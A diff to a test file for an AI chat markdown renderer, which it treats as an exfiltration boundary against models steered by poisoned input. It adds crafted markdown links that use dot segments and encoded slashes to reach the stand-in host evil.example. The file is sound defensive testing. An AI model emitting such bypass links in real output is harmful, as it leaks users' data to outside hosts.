@@ -2,7 +2,7 @@ import { expect, test } from 'bun:test';
 import { createElement } from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
 
-import { AiMarkdown, isSameOriginPath, splitAnswerBlocks } from '@/components/shared/ai-markdown';
+import { AiMarkdown, sameOriginTarget, splitAnswerBlocks } from '@/components/shared/ai-markdown';
 
 // The renderer of model text is an exfiltration boundary (B11,
 // werk-flow/werkflow-planning#530): a model talked into it by a poisoned
@@ -34,6 +34,8 @@ const EXFILTRATION_CORPUS: ReadonlyArray<readonly [string, string]> = [
   ['backslash link', '[x](/\\evil.example/?d=geheim)'],
   ['encoded slashes', '[x](%2F%2Fevil.example) und [y](https:%2F%2Fevil.example)'],
   ['tab in the address', '[x](/\t/evil.example)'],
+  ['dot segments collapsing into a second slash', '[x](/.//evil.example) und [y](/a/..//evil.example)'],
+  ['encoded dot segments', '[x](/%2e//evil.example) und [y](/%2E%2E//evil.example)'],
   ['fullwidth solidus', '[x](／／evil.example) und [y](https：／／evil.example)'],
   ['division slash', '[x](/\u2215evil.example) und [y](\u2215\u2215evil.example)'],
   ['Cyrillic scheme', '[x](httрs://evil.example)'],
@@ -56,7 +58,7 @@ function leaks(markup: string): string[] {
   for (const [, name, value] of markup.matchAll(/\s([a-z-]+)="([^"]*)"/g)) {
     if (
       name === 'href' &&
-      !(isSameOriginPath(value ?? '') && value?.startsWith('/') && !value.startsWith('//'))
+      !(sameOriginTarget(value ?? '') && value?.startsWith('/') && !value.startsWith('//'))
     )
       found.push(`href ${value}`);
     if (name !== 'href' && name !== 'class' && name !== 'start' && name !== 'data-slot')
